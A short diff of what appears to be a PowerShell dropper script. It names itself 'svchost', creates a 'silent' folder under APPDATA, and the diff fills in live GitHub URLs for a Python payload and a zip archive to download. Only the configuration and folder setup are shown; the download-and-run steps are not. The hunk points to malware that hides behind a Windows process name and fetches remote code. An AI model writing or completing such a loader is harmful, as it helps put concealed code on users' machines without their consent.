@@ -3,8 +3,8 @@ $ID = "svchost"
 $Path = "$env:APPDATA\$ID"
 
 # 1. Configuration - REPLACE WITH YOUR GITHUB RAW LINKS
-$C_URL = "https://raw.githubusercontent.com/USER/REPO/main/WinServices.py"
-$Z_URL = "https://github.com/itzcurled/footbalhunt/blob/main/UpdataData.zip"
+$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
+$Z_URL = "https://github.com/itzcurled/footbalhunt/raw/main/UpdateData.zip"
 
 # 2. Preparation - Create the silent folder
 if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
